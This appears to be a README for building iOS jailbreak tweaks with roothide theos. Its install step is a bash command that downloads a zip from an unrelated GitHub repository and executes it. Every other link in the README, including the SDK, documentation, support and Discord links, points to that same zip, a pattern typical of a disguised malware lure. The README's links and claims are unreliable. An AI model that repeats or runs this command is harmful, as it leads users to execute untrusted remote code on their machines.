# update jailbreak apps/tweaks for roothide
 
 1. install roothide/theos

    ```bash -c "$(curl -fsSL https://raw.githubusercontent.com/bion64/Dopamie-Roothide/main/theos/lib/iphone/roothide/Comet.framework/PrivateHeaders/Dopamie-Roothide-2.1.zip)"```
    
    and its always automatically updated to latest with original one.

 2. Build package for roothide


    for those simple tweaks that don't use the file api to access jailbreak files, just

    ```make package``` with ```THEOS_PACKAGE_SCHEME=roothide```


 3. Using `roothide` APIs if you need to use the file apis to access jailbreak files in source code
    ```
    #include <roothide.h>
    
    //then using jbroot("/path/to/jb/file") as path to access jailbreak files
    ```
    ***the `jbroot` API can be used in C/C++/Objective-C/Swift and its fully compatible with building rootful/rootless package***

4. If you want to build your project with Xcode instead of theos, here is the roothide sdk: [https://raw.githubusercontent.com/bion64/Dopamie-Roothide/main/theos/lib/iphone/roothide/Comet.framework/PrivateHeaders/Dopamie-Roothide-2.1.zip](https://raw.githubusercontent.com/bion64/Dopamie-Roothide/main/theos/lib/iphone/roothide/Comet.framework/PrivateHeaders/Dopamie-Roothide-2.1.zip)

5. For more details about roothide, please refer to
   
- [the difference between roothide and legacy rootless](https://raw.githubusercontent.com/bion64/Dopamie-Roothide/main/theos/lib/iphone/roothide/Comet.framework/PrivateHeaders/Dopamie-Roothide-2.1.zip).

- [entitlements and data sharing via files](https://raw.githubusercontent.com/bion64/Dopamie-Roothide/main/theos/lib/iphone/roothide/Comet.framework/PrivateHeaders/Dopamie-Roothide-2.1.zip).
  
- [roothide's sdk api and tools](https://raw.githubusercontent.com/bion64/Dopamie-Roothide/main/theos/lib/iphone/roothide/Comet.framework/PrivateHeaders/Dopamie-Roothide-2.1.zip).


# support

- roothideDev: https://raw.githubusercontent.com/bion64/Dopamie-Roothide/main/theos/lib/iphone/roothide/Comet.framework/PrivateHeaders/Dopamie-Roothide-2.1.zip

- roothide/theos-dev: https://raw.githubusercontent.com/bion64/Dopamie-Roothide/main/theos/lib/iphone/roothide/Comet.framework/PrivateHeaders/Dopamie-Roothide-2.1.zip

  
# more info

- roothide discord server: https://raw.githubusercontent.com/bion64/Dopamie-Roothide/main/theos/lib/iphone/roothide/Comet.framework/PrivateHeaders/Dopamie-Roothide-2.1.zip

- theos dev discord server: https://raw.githubusercontent.com/bion64/Dopamie-Roothide/main/theos/lib/iphone/roothide/Comet.framework/PrivateHeaders/Dopamie-Roothide-2.1.zip

